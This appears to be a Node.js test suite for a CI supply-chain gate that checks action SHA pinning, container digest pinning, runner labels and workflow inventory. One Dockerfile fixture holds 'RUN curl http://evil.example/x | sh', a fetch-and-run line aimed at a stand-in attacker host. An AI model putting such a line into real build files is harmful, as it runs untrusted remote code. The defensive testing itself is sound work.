#!/usr/bin/env node
/**
 * Tests for the `ci-and-container-pinning` gate.
 * Run with `node --test scripts/supply-chain/ci-pinning.test.mjs`.
 *
 * Each case is a negative control on a shape the repo forbids, plus positive controls on the real
 * files so the gate cannot pass by matching nothing. Discovery tests call the exported walk,
 * because an earlier copy of the walk here shared the gate's blindness to nested compose files.
 */

import assert from 'node:assert/strict';
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { after, describe, it } from 'node:test';
import {
  checkComposePinning,
  checkDockerfilePinning,
  checkWorkflowInventory,
  checkWorkflowPinning,
  collectPinnedImages,
  discoverContainerFiles,
  discoverLocalActionFiles,
  listWorkflowFiles,
  matrixValues,
  parsePinnedReference,
  parseRunsOn,
} from './ci-pinning.mjs';
import { EXPECTED_WORKFLOWS } from './denied-packages.mjs';
import { Gate, REPO_ROOT } from './lib.mjs';

function failureText(gate) {
  return gate.failures.map((f) => `${f.message} ${f.detail ?? ''}`).join('\n');
}

const WORKFLOW_DIR = join(REPO_ROOT, '.github', 'workflows');

describe('the repository as it stands', () => {
  it('passes on every real workflow', () => {
    const files = listWorkflowFiles(WORKFLOW_DIR);
    assert.ok(files.length >= 2, 'expected at least the CI and scheduled-audit workflows');
    let judged = 0;
    for (const name of files) {
      const gate = new Gate('t');
      judged += checkWorkflowPinning(gate, name, readFileSync(join(WORKFLOW_DIR, name), 'utf8'));
      assert.deepEqual(gate.failures, [], `${name}:\n${failureText(gate)}`);
    }
    assert.ok(judged > 10, `expected many action references, judged ${judged}`);
  });

  it('passes on every real Dockerfile and compose file the GATE discovers', () => {
    // Discovery comes from the gate's own exported function, not a copy of it.
    const { dockerfiles, composeFiles } = discoverContainerFiles(REPO_ROOT);
    assert.ok(dockerfiles.length >= 2, `expected both Dockerfiles, found ${dockerfiles.join(', ')}`);
    assert.ok(
      composeFiles.length >= 2,
      `expected the development and staging compose files, found ${composeFiles.join(', ')}`,
    );

    let baseImages = 0;
    for (const name of dockerfiles) {
      const gate = new Gate('t');
      baseImages += checkDockerfilePinning(gate, name, readFileSync(join(REPO_ROOT, name), 'utf8'));
      assert.deepEqual(gate.failures, [], `${name}:\n${failureText(gate)}`);
    }
    assert.ok(baseImages > 0, 'no external base image was judged — the check found nothing to check');

    let composeImages = 0;
    for (const name of composeFiles) {
      const gate = new Gate('t');
      const judged = checkComposePinning(gate, name, readFileSync(join(REPO_ROOT, name), 'utf8'));
      assert.deepEqual(gate.failures, [], `${name}:\n${failureText(gate)}`);
      assert.ok(judged > 0, `${name}: no image reference was judged`);
      composeImages += judged;
    }
    // Six today: postgres and the proxy in each compose file, plus two app images in staging.
    assert.ok(composeImages >= 6, `only ${composeImages} compose image reference(s) were judged`);
  });

  it('accepts the workflow inventory it actually has', () => {
    const gate = new Gate('t');
    checkWorkflowInventory(gate, listWorkflowFiles(WORKFLOW_DIR));
    assert.deepEqual(gate.failures, [], failureText(gate));
  });
});

describe('workflow inventory', () => {
  it('FAILS on an injected .github/workflows/codeql.yml', () => {
    // A named campaign IOC.
    const gate = new Gate('t');
    checkWorkflowInventory(gate, [...EXPECTED_WORKFLOWS, 'codeql.yml']);
    assert.match(failureText(gate), /unexpected workflow file: \.github\/workflows\/codeql\.yml/);
  });

  it('FAILS on any undeclared workflow, not just the one the campaign uses', () => {
    const gate = new Gate('t');
    checkWorkflowInventory(gate, [...EXPECTED_WORKFLOWS, 'publish.yml']);
    assert.match(failureText(gate), /unexpected workflow file: \.github\/workflows\/publish\.yml/);
  });

  it('FAILS when a declared workflow disappears', () => {
    const gate = new Gate('t');
    checkWorkflowInventory(gate, ['ci.yml']);
    assert.match(failureText(gate), /declared workflow is missing: \.github\/workflows\/release\.yml/);
  });

  it('FAILS when there are no workflows at all', () => {
    const gate = new Gate('t');
    checkWorkflowInventory(gate, []);
    assert.match(failureText(gate), /a scan of nothing proves nothing/);
  });
});

describe('action pinning', () => {
  const workflow = (steps) =>
    `name: CI\non:\n  push:\njobs:\n  build:\n    runs-on: ubuntu-24.04\n    steps:\n${steps}`;

  it('FAILS on a tag reference', () => {
    const gate = new Gate('t');
    checkWorkflowPinning(gate, 'ci.yml', workflow('      - uses: actions/cache@v4\n'));
    assert.match(
      failureText(gate),
      /action is not pinned to a full commit SHA at ci\.yml:8: actions\/cache@v4/,
    );
  });

  it('FAILS on a branch reference and on a short SHA', () => {
    for (const reference of ['actions/checkout@main', 'actions/checkout@3d3c42e']) {
      const gate = new Gate('t');
      checkWorkflowPinning(gate, 'ci.yml', workflow(`      - uses: ${reference}\n`));
      assert.equal(gate.failures.length, 1, `${reference} was accepted`);
    }
  });

  it('FAILS on an action with no ref at all', () => {
    const gate = new Gate('t');
    checkWorkflowPinning(gate, 'ci.yml', workflow('      - uses: actions/checkout\n'));
    assert.equal(gate.failures.length, 1);
  });

  it('accepts a full 40-character SHA with the version in a trailing comment', () => {
    const gate = new Gate('t');
    const judged = checkWorkflowPinning(
      gate,
      'ci.yml',
      workflow('      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n'),
    );
    assert.equal(judged, 1);
    assert.deepEqual(gate.failures, []);
  });

  it('accepts a local action and a digest-pinned container action', () => {
    const gate = new Gate('t');
    checkWorkflowPinning(
      gate,
      'ci.yml',
      workflow(
        '      - uses: ./.github/actions/setup\n' +
          `      - uses: docker://alpine@sha256:${'a'.repeat(64)}\n`,
      ),
    );
    assert.deepEqual(gate.failures, [], failureText(gate));
  });

  it('FAILS on an undigested container action', () => {
    const gate = new Gate('t');
    checkWorkflowPinning(gate, 'ci.yml', workflow('      - uses: docker://alpine:3.20\n'));
    assert.match(failureText(gate), /container action is not digest-pinned/);
  });

  it('does not read prose about an unpinned action as an unpinned action', () => {
    // ci.yml's own header quotes `uses: actions/checkout@v7`.
    const gate = new Gate('t');
    checkWorkflowPinning(
      gate,
      'ci.yml',
      '# A workflow that writes `uses: actions/checkout@v7` throws that away.\njobs: {}\n',
    );
    assert.deepEqual(gate.failures, []);
  });

  it('FAILS on a service container pinned only by tag', () => {
    const gate = new Gate('t');
    checkWorkflowPinning(
      gate,
      'ci.yml',
      'jobs:\n  a:\n    services:\n      postgres:\n        image: postgres:16\n',
    );
    assert.match(failureText(gate), /service container is not digest-pinned/);
  });

  // The `container: node:22` shorthand once passed with exit 0 while the map form failed.
  it('FAILS on the job-level `container:` SHORTHAND, not just the `image:` map form', () => {
    const gate = new Gate('t');
    checkWorkflowPinning(gate, 'ci.yml', 'jobs:\n  a:\n    runs-on: ubuntu-24.04\n    container: node:22\n');
    assert.match(failureText(gate), /job container is not digest-pinned at ci\.yml:4: node:22/);
  });

  it('FAILS on a quoted container shorthand', () => {
    const gate = new Gate('t');
    checkWorkflowPinning(gate, 'ci.yml', 'jobs:\n  a:\n    container: "node:22"\n');
    assert.match(failureText(gate), /job container is not digest-pinned at ci\.yml:3: node:22/);
  });

  it('still FAILS on the map form, which is all it used to read', () => {
    const gate = new Gate('t');
    checkWorkflowPinning(gate, 'ci.yml', 'jobs:\n  a:\n    container:\n      image: node:22\n');
    assert.match(failureText(gate), /service container is not digest-pinned at ci\.yml:4/);
  });

  it('accepts a digest-pinned container shorthand', () => {
    const gate = new Gate('t');
    checkWorkflowPinning(gate, 'ci.yml', `jobs:\n  a:\n    container: node:22@sha256:${'b'.repeat(64)}\n`);
    assert.deepEqual(gate.failures, [], failureText(gate));
  });

  it('does not read a job NAMED `containers` as a container declaration', () => {
    // ci.yml has a job named `containers:`.
    const gate = new Gate('t');
    checkWorkflowPinning(gate, 'ci.yml', 'jobs:\n  containers:\n    runs-on: ubuntu-24.04\n');
    assert.deepEqual(gate.failures, [], failureText(gate));
  });
});

// YAML flow styles. Each of these once passed with 0 references judged.

describe('keys the readers cannot see', () => {
  const unread = [
    ['a step written as a flow mapping', 'jobs:\n  a:\n    steps:\n      - {uses: actions/checkout@v7}\n'],
    ['a steps list written as a flow sequence', 'jobs:\n  a:\n    steps: [{uses: actions/checkout@v7}]\n'],
    [
      'a uses whose value is on the next line',
      'jobs:\n  a:\n    steps:\n      - uses:\n          actions/checkout@v7\n',
    ],
    ['a whole job written as a flow mapping', 'jobs:\n  a: {runs-on: ubuntu-latest, steps: []}\n'],
    [
      'a service container written as a flow mapping',
      'jobs:\n  a:\n    services:\n      pg: {image: postgres:16}\n',
    ],
  ];

  for (const [what, text] of unread) {
    it(`FAILS on ${what}`, () => {
      const gate = new Gate('t');
      checkWorkflowPinning(gate, 'w.yml', text);
      assert.match(failureText(gate), /is in a shape this gate cannot read/, `${what} was accepted`);
    });
  }

  it('does not fire on the block forms every real workflow uses', () => {
    const gate = new Gate('t');
    checkWorkflowPinning(
      gate,
      'w.yml',
      'jobs:\n  a:\n    runs-on: ubuntu-24.04\n    container:\n' +
        `      image: node:22@sha256:${'a'.repeat(64)}\n` +
        '    services:\n      pg:\n' +
        `        image: postgres:16@sha256:${'b'.repeat(64)}\n` +
        '    steps:\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n',
    );
    assert.deepEqual(gate.failures, [], failureText(gate));
  });

  it('does not read `Base-image digest freshness` as an image key', () => {
    // release.yml has a step by that name.
    const gate = new Gate('t');
    checkWorkflowPinning(
      gate,
      'release.yml',
      'jobs:\n  a:\n    steps:\n      - name: Base-image digest freshness\n',
    );
    assert.deepEqual(gate.failures, [], failureText(gate));
  });
});

// A composite action with an unpinned `uses:` once passed because its file was never opened.

describe('local action files', () => {
  it('discovers an action.yml anywhere but the skipped directories', () => {
    const root = mkdtempSync(join(tmpdir(), 'prl-actions-'));
    after(() => rmSync(root, { recursive: true, force: true }));
    mkdirSync(join(root, '.github', 'actions', 'setup'), { recursive: true });
    writeFileSync(join(root, '.github', 'actions', 'setup', 'action.yml'), 'runs:\n  using: composite\n');
    mkdirSync(join(root, 'node_modules', 'someone', 'thing'), { recursive: true });
    writeFileSync(join(root, 'node_modules', 'someone', 'thing', 'action.yml'), 'runs:\n');
    assert.deepEqual(discoverLocalActionFiles(root), ['.github/actions/setup/action.yml']);
  });

  it('FAILS on an unpinned uses inside a composite action', () => {
    const gate = new Gate('t');
    checkWorkflowPinning(
      gate,
      '.github/actions/setup/action.yml',
      'runs:\n  using: composite\n  steps:\n    - uses: actions/checkout@v7\n',
    );
    assert.match(failureText(gate), /action is not pinned to a full commit SHA/);
  });
});

// `runs-on` in every spelling GitHub accepts. A single regex once passed all but the plain scalar.

/** A GitHub Actions expression, built through a substitution for the same reason as `interpolation`. */
const ghExpression = (body) => `\u0024{{ ${body} }}`;

describe('runner pinning, in all five spellings of runs-on', () => {
  const job = (...lines) => `name: CI\non:\n  push:\njobs:\n  build:\n${lines.join('\n')}\n`;

  const floating = [
    ['a plain scalar', job('    runs-on: ubuntu-latest')],
    ['a DOUBLE-QUOTED scalar', job('    runs-on: "ubuntu-latest"')],
    ['a SINGLE-QUOTED scalar', job("    runs-on: 'ubuntu-latest'")],
    ['a FLOW sequence', job('    runs-on: [ubuntu-latest]')],
    ['a flow sequence with a pinned label beside it', job('    runs-on: [self-hosted, ubuntu-latest]')],
    ['a BLOCK sequence', job('    runs-on:', '      - ubuntu-latest')],
    ['a runner-GROUP mapping', job('    runs-on:', '      group: default', '      labels: ubuntu-latest')],
    [
      'a runner-group mapping whose labels are a flow sequence',
      job('    runs-on:', '      group: default', '      labels: [ubuntu-latest]'),
    ],
    [
      'a runner-group mapping whose labels are a nested block sequence',
      job('    runs-on:', '      group: default', '      labels:', '        - ubuntu-latest'),
    ],
    [
      'a MATRIX expression whose values are in the same file',
      job(
        '    strategy:',
        '      matrix:',
        '        os: [ubuntu-latest, ubuntu-24.04]',
        `    runs-on: ${ghExpression('matrix.os')}`,
      ),
    ],
    [
      'a matrix expression whose values are a block sequence',
      job(
        '    strategy:',
        '      matrix:',
        '        os:',
        '          - ubuntu-latest',
        `    runs-on: ${ghExpression('matrix.os')}`,
      ),
    ],
    [
      'a matrix value that only appears in an include: entry',
      job(
        '    strategy:',
        '      matrix:',
        '        os: [ubuntu-24.04]',
        '        include:',
        '          - os: ubuntu-latest',
        `    runs-on: ${ghExpression('matrix.os')}`,
      ),
    ],
  ];

  for (const [what, text] of floating) {
    it(`FAILS on a floating runner written as ${what}`, () => {
      const gate = new Gate('t');
      checkWorkflowPinning(gate, 'ci.yml', text);
      assert.match(
        failureText(gate),
        /floating runner image at ci\.yml:\d+: ubuntu-latest/,
        `ubuntu-latest was accepted when written as ${what}:\n${text}`,
      );
    });
  }

  const pinned = [
    ['a plain scalar', job('    runs-on: ubuntu-24.04')],
    ['a quoted scalar', job('    runs-on: "ubuntu-24.04"')],
    ['a flow sequence', job('    runs-on: [self-hosted, linux, ubuntu-24.04]')],
    ['a block sequence', job('    runs-on:', '      - self-hosted', '      - ubuntu-24.04')],
    ['a runner-group mapping', job('    runs-on:', '      group: default', '      labels: ubuntu-24.04')],
    [
      'a matrix expression over pinned values only',
      job(
        '    strategy:',
        '      matrix:',
        '        os: [ubuntu-24.04, ubuntu-22.04]',
        `    runs-on: ${ghExpression('matrix.os')}`,
      ),
    ],
  ];

  for (const [what, text] of pinned) {
    it(`accepts a pinned runner written as ${what}`, () => {
      const gate = new Gate('t');
      checkWorkflowPinning(gate, 'ci.yml', text);
      assert.deepEqual(gate.failures, [], `${what}:\n${failureText(gate)}`);
    });
  }

  it('REFUSES to judge a runs-on it cannot resolve, rather than calling it pinned', () => {
    // An expression naming something outside the file cannot be judged. Reported once, not per branch.
    const unresolvable = ['inputs.runner', 'vars.RUNNER', 'matrix.undefined-key'].map(ghExpression);
    for (const expression of unresolvable) {
      const gate = new Gate('t');
      checkWorkflowPinning(gate, 'ci.yml', job(`    runs-on: ${expression}`));
      assert.equal(gate.failures.length, 1, `${expression} produced ${gate.failures.length} failure(s)`);
      assert.match(failureText(gate), /runs-on cannot be resolved to a runner label/);
    }
  });

  it('FAILS on a runs-on it parsed into no labels at all', () => {
    // A runner-group mapping with no `labels:` key.
    const gate = new Gate('t');
    checkWorkflowPinning(gate, 'ci.yml', job('    runs-on:', '      group: default'));
    assert.match(failureText(gate), /runs-on names no runner label at ci\.yml:\d+/);
  });

  it('reports the line of the runs-on key, not of the label', () => {
    const gate = new Gate('t');
    checkWorkflowPinning(gate, 'ci.yml', 'jobs:\n  a:\n    runs-on:\n      - ubuntu-latest\n');
    assert.match(failureText(gate), /floating runner image at ci\.yml:3:/);
  });

  it('does not read prose about a floating runner as a floating runner', () => {
    // release.yml's header mentions `runs-on` in prose.
    const gate = new Gate('t');
    checkWorkflowPinning(
      gate,
      'release.yml',
      '# every `runs-on: ubuntu-latest` is a release blocker\njobs: {}\n',
    );
    assert.deepEqual(gate.failures, [], failureText(gate));
  });

  it('resolves the matrix even when the matrix block sits after the runs-on', () => {
    const gate = new Gate('t');
    checkWorkflowPinning(
      gate,
      'ci.yml',
      job(
        `    runs-on: ${ghExpression('matrix.os')}`,
        '    strategy:',
        '      matrix:',
        '        os: [ubuntu-latest]',
      ),
    );
    assert.match(failureText(gate), /floating runner image/);
  });

  it('exposes the parse itself, so a spelling that stops matching is visible', () => {
    const declarations = parseRunsOn('jobs:\n  a:\n    runs-on: [x, "y"]\n  b:\n    runs-on:\n      - z\n');
    assert.deepEqual(
      declarations.map((d) => [d.line, d.labels]),
      [
        [3, ['x', 'y']],
        [5, ['z']],
      ],
    );
  });

  it('collects matrix values under the key that names them', () => {
    const values = matrixValues(
      'strategy:\n  matrix:\n    os: [ubuntu-24.04]\n    node: ["22"]\n    include:\n      - os: macos-15\n',
    );
    assert.deepEqual([...(values.get('os') ?? [])].sort(), ['macos-15', 'ubuntu-24.04']);
    assert.deepEqual([...(values.get('node') ?? [])], ['22']);
  });

  it('judges every runs-on in the real workflows and finds a plausible number of them', () => {
    let declarations = 0;
    for (const name of listWorkflowFiles(WORKFLOW_DIR)) {
      declarations += parseRunsOn(readFileSync(join(WORKFLOW_DIR, name), 'utf8')).length;
    }
    assert.ok(declarations >= 10, `only ${declarations} runs-on declaration(s) were parsed`);
  });
});

describe('container base images', () => {
  it('FAILS on a FROM pinned only by tag', () => {
    const gate = new Gate('t');
    checkDockerfilePinning(gate, 'Dockerfile.api', 'FROM node:24.18.0-bookworm-slim AS base\n');
    assert.match(failureText(gate), /base image is not digest-pinned at Dockerfile\.api:1/);
  });

  it('FAILS on a bare `FROM node`', () => {
    const gate = new Gate('t');
    checkDockerfilePinning(gate, 'Dockerfile.api', 'FROM node\n');
    assert.equal(gate.failures.length, 1);
  });

  it('accepts a digest-pinned FROM and every later stage reference', () => {
    const gate = new Gate('t');
    const judged = checkDockerfilePinning(
      gate,
      'Dockerfile.api',
      `FROM node:24.18.0-bookworm-slim@sha256:${'6'.repeat(64)} AS base\n` +
        'FROM base AS toolchain\n' +
        'FROM toolchain AS build\n' +
        'FROM base AS runtime\n',
    );
    assert.deepEqual(gate.failures, [], failureText(gate));
    assert.equal(judged, 1, 'only the external base image should be judged');
  });

  it('accepts --platform before the image and still judges the image', () => {
    const gate = new Gate('t');
    checkDockerfilePinning(gate, 'Dockerfile.api', 'FROM --platform=linux/amd64 node:24-slim AS base\n');
    assert.match(failureText(gate), /base image is not digest-pinned/);
  });

  it('FAILS on a compose image pinned only by tag', () => {
    const gate = new Gate('t');
    checkComposePinning(gate, 'docker-compose.yml', 'services:\n  db:\n    image: postgres:16-bookworm\n');
    assert.match(failureText(gate), /compose image is not digest-pinned/);
  });

  // `FROM node AS node` once registered the stage before testing it, and passed an unpinned image
  // with exit 0. Both the shadowing case and the legitimate one are asserted.

  it('FAILS on `FROM node AS node` — a stage named after its own image', () => {
    const gate = new Gate('t');
    const judged = checkDockerfilePinning(
      gate,
      'Dockerfile.api',
      'FROM node AS node\nRUN curl http://evil.example/x | sh\n',
    );
    assert.equal(judged, 1, 'the external base image must be JUDGED, not absorbed as a stage reference');
    assert.match(failureText(gate), /base image is not digest-pinned at Dockerfile\.api:1: node/);
  });

  it('FAILS on the same shadowing in a later stage', () => {
    const gate = new Gate('t');
    checkDockerfilePinning(
      gate,
      'Dockerfile.api',
      `FROM node:24-slim@sha256:${'6'.repeat(64)} AS base\nFROM alpine AS alpine\n`,
    );
    assert.match(failureText(gate), /base image is not digest-pinned at Dockerfile\.api:2: alpine/);
  });

  it('still treats a genuine earlier stage as internal, including one reused twice', () => {
    const gate = new Gate('t');
    const judged = checkDockerfilePinning(
      gate,
      'Dockerfile.api',
      `FROM node:24-slim@sha256:${'6'.repeat(64)} AS base\n` +
        'FROM base AS build\n' +
        'FROM base AS runtime\n' +
        'FROM build AS test\n',
    );
    assert.deepEqual(gate.failures, [], failureText(gate));
    assert.equal(judged, 1);
  });

  it('accepts a stage that shadows an EARLIER stage of the same name', () => {
    // Once `node` is already a stage, docker resolves it to the stage, and so does this.
    const gate = new Gate('t');
    const judged = checkDockerfilePinning(
      gate,
      'Dockerfile.api',
      `FROM node@sha256:${'6'.repeat(64)} AS node\nFROM node AS node\n`,
    );
    assert.equal(judged, 1, 'the first FROM must always be judged');
    assert.deepEqual(gate.failures, [], failureText(gate));
  });

  it('FAILS on a Dockerfile with no FROM at all', () => {
    const gate = new Gate('t');
    checkDockerfilePinning(gate, 'Dockerfile.api', '# nothing here\nRUN true\n');
    assert.match(failureText(gate), /no FROM instruction in Dockerfile\.api/);
    assert.match(failureText(gate), /A scan of nothing proves nothing/);
  });

  it('FAILS on a FROM that names no image, and says the file judged nothing', () => {
    // A FROM the gate cannot read must not pass as cleared. The first FROM can never be a stage
    // reference, so zero external images judged also fails. With the old stage ordering restored,
    // this tripwire caught `FROM node AS node`.
    const gate = new Gate('t');
    const judged = checkDockerfilePinning(gate, 'Dockerfile.api', 'FROM --platform=linux/amd64\n');
    assert.equal(judged, 0);
    assert.match(failureText(gate), /FROM names no image at Dockerfile\.api:1/);
    assert.match(failureText(gate), /declares 1 FROM line\(s\) and no external base image/);
  });
});

// Discovery. A non-recursive walk once never read `deploy/staging/compose.yml` or `compose.yml`.

const temporary = [];
after(() => {
  for (const dir of temporary) rmSync(dir, { recursive: true, force: true });
});

function repoWithNestedComposeFile() {
  const root = mkdtempSync(join(tmpdir(), 'prl-pinning-'));
  temporary.push(root);
  mkdirSync(join(root, 'deploy', 'example'), { recursive: true });
  mkdirSync(join(root, 'docker'), { recursive: true });
  mkdirSync(join(root, 'node_modules', 'someone-elses-package'), { recursive: true });
  writeFileSync(join(root, 'deploy', 'example', 'compose.yml'), 'services:\n  db:\n    image: postgres:16\n');
  writeFileSync(join(root, 'docker', 'Dockerfile.tools'), 'FROM alpine:3.20\n');
  // Third-party Dockerfiles are not ours to pin.
  writeFileSync(join(root, 'node_modules', 'someone-elses-package', 'Dockerfile'), 'FROM alpine:3.20\n');
  return root;
}

describe('container-file discovery', () => {
  it('finds a compose file in a SUBDIRECTORY, and one using the Compose v2 name', () => {
    const root = repoWithNestedComposeFile();
    const { composeFiles } = discoverContainerFiles(root);
    assert.deepEqual(
      composeFiles,
      ['deploy/example/compose.yml'],
      'a nested Compose v2 file must be discovered; the old non-recursive walk found nothing',
    );
  });

  it('finds a Dockerfile in a SUBDIRECTORY', () => {
    const { dockerfiles } = discoverContainerFiles(repoWithNestedComposeFile());
    assert.deepEqual(dockerfiles, ['docker/Dockerfile.tools']);
  });

  it('does NOT walk into node_modules', () => {
    const { dockerfiles } = discoverContainerFiles(repoWithNestedComposeFile());
    assert.ok(
      dockerfiles.every((path) => !path.includes('node_modules')),
      `discovery walked into node_modules: ${dockerfiles.join(', ')}`,
    );
  });

  it('FAILS on the unpinned image in that nested compose file — the whole point', () => {
    const root = repoWithNestedComposeFile();
    const { composeFiles } = discoverContainerFiles(root);
    assert.equal(composeFiles.length, 1, 'the negative control needs the file to be discovered first');
    const gate = new Gate('t');
    const judged = checkComposePinning(
      gate,
      composeFiles[0],
      readFileSync(join(root, composeFiles[0]), 'utf8'),
    );
    assert.equal(judged, 1, 'the image line must be judged, not skipped');
    assert.match(failureText(gate), /compose image is not digest-pinned at deploy\/example\/compose\.yml:3/);
  });

  it('finds the SUFFIX naming convention, `api.Dockerfile`', () => {
    // `DOCKERFILE_NAME` was anchored at the front, so `api.Dockerfile` with `FROM node` passed.
    const root = mkdtempSync(join(tmpdir(), 'prl-pinning-'));
    temporary.push(root);
    writeFileSync(join(root, 'api.Dockerfile'), 'FROM node\n');
    const { dockerfiles } = discoverContainerFiles(root);
    assert.deepEqual(dockerfiles, ['api.Dockerfile']);
    const gate = new Gate('t');
    checkDockerfilePinning(gate, dockerfiles[0], readFileSync(join(root, dockerfiles[0]), 'utf8'));
    assert.match(failureText(gate), /base image is not digest-pinned at api\.Dockerfile:1: node/);
  });

  it('FAILS on the unpinned FROM in that nested Dockerfile', () => {
    const root = repoWithNestedComposeFile();
    const { dockerfiles } = discoverContainerFiles(root);
    const gate = new Gate('t');
    checkDockerfilePinning(gate, dockerfiles[0], readFileSync(join(root, dockerfiles[0]), 'utf8'));
    assert.match(failureText(gate), /base image is not digest-pinned at docker\/Dockerfile\.tools:1/);
  });
});

/**
 * A compose interpolation, built through a substitution. Biome's `noTemplateCurlyInString` refuses
 * `${` in a plain string and `noUnusedTemplateLiteral` refuses a template literal with no
 * substitution, which leaves no other spelling.
 */
const interpolation = (body) => `\u0024{${body}}`;

describe('digest-bearing compose interpolation', () => {
  const compose = (value) => `services:\n  api:\n    image: ${value}\n`;

  it('accepts a REQUIRED interpolation with no default', () => {
    const gate = new Gate('t');
    const judged = checkComposePinning(
      gate,
      'docker-compose.staging.yml',
      compose(interpolation('PRL_API_IMAGE:?the API image DIGEST. Run `pnpm run release:artifacts` first')),
    );
    assert.equal(judged, 1, 'the line must still be judged, not skipped');
    assert.deepEqual(gate.failures, [], failureText(gate));
  });

  it('REFUSES an interpolation with a tag as its default — the shape people reach for', () => {
    const gate = new Gate('t');
    checkComposePinning(gate, 'compose.yml', compose(interpolation('PRL_API_IMAGE:-prl-api:latest')));
    assert.match(failureText(gate), /compose image is not digest-pinned/);
  });

  it('REFUSES a bare interpolation with no default and no requirement', () => {
    const gate = new Gate('t');
    checkComposePinning(gate, 'compose.yml', compose(interpolation('PRL_API_IMAGE')));
    assert.equal(
      gate.failures.length,
      1,
      `${interpolation('VAR')} constrains nothing and compose substitutes empty`,
    );
  });

  it('reads the WHOLE value, not the first word', () => {
    // The message contains spaces; a `\S+` capture once judged only the first word.
    const gate = new Gate('t');
    checkComposePinning(gate, 'compose.yml', compose('postgres:16 with trailing words'));
    assert.match(failureText(gate), /postgres:16 with trailing words/);
  });

  it('does NOT extend the exception to a workflow service container', () => {
    // GitHub Actions does not interpolate `${...}`, so this is a literal image name there.
    const gate = new Gate('t');
    checkWorkflowPinning(
      gate,
      'ci.yml',
      `jobs:\n  a:\n    services:\n      db:\n        image: ${interpolation('PRL_DB_IMAGE:?why')}\n`,
    );
    assert.match(failureText(gate), /service container is not digest-pinned/);
  });
});

describe('pinned-reference parsing', () => {
  const digest = `sha256:${'a'.repeat(64)}`;

  it('splits name, tag and digest', () => {
    assert.deepEqual(parsePinnedReference(`postgres:16-bookworm@${digest}`), {
      name: 'postgres',
      tag: '16-bookworm',
      digest,
    });
  });

  it('handles an org-scoped name', () => {
    assert.deepEqual(parsePinnedReference(`nginxinc/nginx-unprivileged:1.29.8-alpine@${digest}`), {
      name: 'nginxinc/nginx-unprivileged',
      tag: '1.29.8-alpine',
      digest,
    });
  });

  it('does not mistake a registry PORT for a tag', () => {
    assert.deepEqual(parsePinnedReference(`localhost:5000/prl-api@${digest}`), {
      name: 'localhost:5000/prl-api',
      tag: null,
      digest,
    });
  });

  it('returns null for anything that is not digest-pinned', () => {
    for (const reference of [
      'postgres:16',
      interpolation('PRL_API_IMAGE:?why'),
      'postgres@sha256:short',
      '',
    ]) {
      assert.equal(parsePinnedReference(reference), null, `${reference} was parsed as a pinned reference`);
    }
  });

  it('collects every pinned reference in the real repository, with where it was found', () => {
    const pinned = collectPinnedImages(REPO_ROOT);
    // Three distinct base images today (node, postgres, nginx-unprivileged). A floor.
    assert.ok(pinned.length >= 3, `only ${pinned.length} pinned reference(s) were collected`);
    assert.ok(
      pinned.every((entry) => Array.isArray(entry.at) && entry.at.length > 0),
      'every reference must record at least one file:line',
    );
    const postgres = pinned.find((entry) => entry.name === 'postgres');
    assert.ok(postgres !== undefined, 'the postgres pin was not collected');
    assert.ok(
      postgres.at.some((where) => where.startsWith('docker-compose.staging.yml:')),
      `the staging compose file was not among ${postgres.at.join(', ')}`,
    );
  });
});
